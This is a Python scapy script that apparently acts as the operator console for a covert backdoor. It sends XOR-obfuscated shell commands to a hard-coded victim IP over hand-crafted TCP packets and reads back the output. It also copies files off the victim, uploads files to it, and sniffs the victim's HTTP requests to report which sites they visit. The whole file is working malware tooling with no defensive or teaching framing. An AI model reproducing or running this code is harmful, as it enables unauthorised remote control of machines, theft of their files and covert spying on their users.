from scapy.all import *
import threading
import sys
import time

victim_ip = "10.0.2.5"
my_ip = "10.0.2.15"
my_port = 443
load_layer("http")

verbose_mode = False
if "-v" in sys.argv:
    verbose_mode = None

# Just some hard-coded ports.
command_port = 11235
file_port = 53214
file_port2 = 43921

def encryptStr(s):
    out = ""
    for i in range(len(s)):
        out += chr(ord(s[i]) ^ (0xff+i))
    return out

def filterHTTP(x):
    if IP in x and x[IP].dst != my_ip:
        return False
    if HTTP in x and "Method" in x['HTTP'].payload.fields and (x['HTTP'].payload.Method == b"GET" or x['HTTP'].payload.Method == b'POST'):
        return True
    return False

def printNotification(x):
    servername = ''
    ip = x[IP].src
    if HTTP in x:
        servername = x[HTTPRequest].Host.decode("utf-8")
    print("Victim is visiting " + servername + " at " + ip)

def receiveNotification():
    sniff(lfilter=filterHTTP,prn=printNotification)

def answerPacket(pac):
    tmp = pac[IP].src
    pac[IP].src = pac[IP].dst
    pac[IP].dst = tmp
    pac[TCP].flags = 18
    tmp2 = pac[TCP].seq
    pac[TCP].seq = pac[TCP].ack
    pac[TCP].ack = tmp2
    prt = pac[TCP].sport
    pac[TCP].sport = pac[TCP].dport
    pac[TCP].dport = prt
    send(pac[IP],verbose=verbose_mode)

def sendFile(filename):
    try:
        f = open(filename,"rb")
    except:
        return
    s = f.read()
    f.close()
    chunksize = 500
    if len(s) % chunksize != 0:
        chunknum = len(s) // chunksize + 1
    else:
        chunknum = len(s) // chunksize

    time.sleep(1)
    send(IP(src=my_ip,dst=victim_ip)/TCP(sport=file_port2,dport=file_port2,seq=chunknum),verbose=verbose_mode)

    time.sleep(1)
    i = 0
    while(i<len(s)):
        send(IP(src=my_ip,dst=victim_ip)/TCP(sport=file_port2,dport=file_port2,ack=i)/Raw(load=s[i:min(i+chunksize,len(s))]),verbose=verbose_mode)
        i+=chunksize

def receiveFile(outfilename):
    pac = sniff(lfilter=lambda x:TCP in x and
                                 x[IP].src == victim_ip and
                                 x[IP].dst == my_ip and
                                 x[TCP].sport == file_port
                ,timeout=10
                ,count=1)
    if list(pac) == []:
        print("Receive File handshake timeout")
        return
    pac = pac[0]
    chunknum = pac[TCP].seq
    answerPacket(pac)

    pacs = []

    if chunknum > 0:
        pacs = sniff(lfilter=lambda x:TCP in x and
                                      x[IP].src == victim_ip and
                                      x[IP].dst == my_ip and
                                      x[TCP].sport == file_port
                     ,timeout=max(chunknum,10)
                     ,count=chunknum)
        if pacs == []:
            print("Receive File timeout")
            return
        pacs = sorted(list(pacs),key=lambda x:x[TCP].ack)

    output = b""
    for i in pacs:
        output += i.payload.load

    try:
        f = open(outfilename,"wb",0)
        f.write(output)
        f.close()
        print("Writing file "+outfilename+". Success.")
    except:
        print("Writing file "+outfilename+". Fail.")

t = threading.Thread(target=receiveNotification)
t.setDaemon(True)
t.start()

while 1:
    s = input("$")
    arr = s.split()
    if len(arr) == 0:
        continue
    elif arr[0] == "exit":
        break
    elif arr[0] == "copy":
        if len(arr) < 3:
            print("Please provide input and output filename")
            continue
        send(IP(src=my_ip, dst=victim_ip) / TCP(sport=my_port, dport=command_port,seq=100,ack=100) / encryptStr(s),verbose=verbose_mode)
        receiveFile(arr[2])
    elif arr[0] == "copy2":
        if len(arr) < 3:
            print("Please provide input and output filename")
            continue
        send(IP(src=my_ip, dst=victim_ip) / TCP(sport=my_port, dport=command_port, seq=100, ack=100) / encryptStr(s),verbose=verbose_mode)
        sendFile(arr[1])
    else:
        if ">" in arr:
            if arr.index(">") == len(arr) - 1:
                print("Please Enter output filename")
                continue
        elif ">>" in arr:
            if arr.index(">>") == len(arr) - 1:
                print("Please Enter output filename")
                continue
        send(IP(src=my_ip,dst=victim_ip)/TCP(sport=my_port,dport=command_port,seq=100,ack=100)/encryptStr(s),verbose=verbose_mode)
        ret = sniff(lfilter=lambda x:TCP in x and
                            x[IP].src == victim_ip and
                            x[IP].dst == my_ip and
                            x[TCP].sport == command_port and
                            x[TCP].seq == 100 and
                            x[TCP].ack == 100
                    ,timeout=10,count=1)
        if(list(ret) == []):
            print("Command output timeout.")
        else:
            ret = ret[0]
            if "-d" in sys.argv:
                ret.show()
            message = encryptStr(ret.payload.load.decode("utf-8"))
            print(message)